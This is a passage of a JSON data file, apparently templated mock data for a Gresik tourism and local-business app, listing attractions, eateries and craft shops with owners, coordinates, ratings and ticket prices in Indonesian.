                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c191_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m192",
                "name": "Pusat Karang Bawean Benjeng",
                "owner": "Cak Sejarah",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.250457,
                    112.581121
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c192_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c192_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m193",
                "name": "Sego Ruwet Balongpanggang",
                "owner": "Cak Keluarga",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.401796,
                    112.634721
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c193_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c193_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m194",
                "name": "Bukit Kapur Duduksampeyan",
                "owner": "Cak Backpacker",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.131403,
                    112.698369
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c194_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c194_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m195",
                "name": "Makam Syekh Wringinanom",
                "owner": "Cak Kulineran",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.161046,
                    112.753342
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c195_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c195_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m196",
                "name": "Benteng Pertahanan Driyorejo",
                "owner": "Cak Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.45389,
                    112.567463
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c196_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c196_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m197",
                "name": "Pengrajin Rebana Hadrah Kedamean",
                "owner": "Cak AlunAlun",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.218581,
                    112.608337
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c197_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c197_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m198",
                "name": "Taman Pasir Bermain Menganti",
                "owner": "Cak Ziarah",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.141051,
                    112.568065
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c198_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c198_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m199",
                "name": "Sanggar Tari Kembang Sidayu",
                "owner": "Cak Sidayu",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.431445,
                    112.745739
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c199_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c199_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m200",
                "name": "Pusat Lepas Tukik Ujungpangkah",
                "owner": "Cak Bawean",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.169934,
                    112.637638
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c200_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c200_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m201",
                "name": "Es Dawet Siwalan Panceng",
                "owner": "Cak Ahmad",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.098903,
                    112.639344
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c201_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c201_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m202",
                "name": "Puncak Awan Bungah",
                "owner": "Cak Budi",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1472214222541-d510753a4707?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.322376,
                    112.56049
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c202_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c202_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m203",
                "name": "Sentra Zikir Tambak Bawean",
                "owner": "Cak Lia",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.178487,
                    112.579664
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c203_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c203_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m204",
                "name": "Monumen Perjuangan Sangkapura Bawean",
                "owner": "Cak Roni",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.162473,
                    112.724071
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c204_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c204_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m205",
                "name": "Sentra Tenun Sarung Kebomas",
                "owner": "Cak Santi",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.41003,
                    112.686385
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c205_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c205_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m206",
                "name": "Taman Bunga Indah Manyar",
                "owner": "Cak Mega",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.169844,
                    112.616755
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c206_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c206_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m207",
                "name": "Kerajinan Lampion Damar Kurung Gresik Kota",
                "owner": "Cak Cak",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.117621,
                    112.699571
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c207_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c207_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m208",
                "name": "Kebun Nanas Madu Cerme",
                "owner": "Cak Mak",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.455652,
                    112.605322
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c208_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c208_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m209",
                "name": "Sego Ruwet Benjeng",
                "owner": "Cak Haji",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.163517,
                    112.686618
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c209_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c209_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m210",
                "name": "Bukit Kapur Balongpanggang",
                "owner": "Cak Neng",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.129278,
                    112.600605
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c210_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c210_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m211",
                "name": "Makam Bupati Duduksampeyan",
                "owner": "Cak Warkop",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.430885,
                    112.593252
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c211_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c211_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m212",
                "name": "Makam Kuno Adipati Wringinanom",
                "owner": "Cak Sejarah",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.24425,
                    112.646725
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c212_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c212_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m213",
                "name": "Batik Goyor ATBM Driyorejo",
                "owner": "Cak Keluarga",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.11633,
                    112.649786
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c213_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c213_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m214",
                "name": "Taman Kota Bertingkat Kedamean",
                "owner": "Cak Backpacker",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.337119,
                    112.724981
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c214_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c214_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m215",
                "name": "Teater Rakyat Gresik Menganti",
                "owner": "Cak Kulineran",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.221025,
                    112.649382
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c215_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c215_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m216",
                "name": "Pusat Karang Bawean Sidayu",
                "owner": "Cak Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.117765,
                    112.607969
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c216_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c216_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m217",
                "name": "Es Dawet Siwalan Ujungpangkah",
                "owner": "Cak AlunAlun",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.262025,
                    112.739672
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c217_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c217_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m218",
                "name": "Puncak Awan Panceng",
                "owner": "Cak Ziarah",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.168439,
                    112.618741
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c218_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c218_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m219",
                "name": "Makam Syekh Bungah",
                "owner": "Cak Sidayu",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.260678,
                    112.606809
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c219_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c219_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m220",
                "name": "Benteng Pertahanan Tambak Bawean",
                "owner": "Cak Bawean",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.371262,
                    112.725526
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c220_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c220_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m221",
                "name": "Pengrajin Rebana Hadrah Sangkapura Bawean",
                "owner": "Cak Ahmad",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.259686,
                    112.660358
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c221_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c221_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m222",
                "name": "Taman Pasir Bermain Kebomas",
                "owner": "Cak Budi",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.112965,
                    112.621917
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c222_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c222_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m223",
                "name": "Sanggar Tari Kembang Manyar",
                "owner": "Cak Lia",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.362013,
                    112.74212
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c223_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c223_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m224",
                "name": "Pusat Lepas Tukik Gresik Kota",
                "owner": "Cak Roni",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.238382,
                    112.629134
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c224_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c224_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m225",
                "name": "Sego Ruwet Cerme",
                "owner": "Cak Santi",
                "type": "kuliner",
